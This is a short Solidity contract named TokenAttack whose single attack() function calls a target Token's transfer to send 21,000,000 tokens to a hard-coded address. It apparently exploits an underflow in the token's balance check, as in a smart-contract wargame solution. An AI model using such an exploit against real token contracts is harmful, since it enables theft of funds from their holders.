pragma solidity ^0.8.0;

import "./Token.sol";

contract TokenAttack {
    Token token;

    constructor(Token _token) public {
        token = Token(_token);
    }

    function attack() public payable {
        token.transfer({_to: 0x86b2636176D99aa6eEeFdD28C7e303E63b574fD6, _value: 21000000});
    }
} 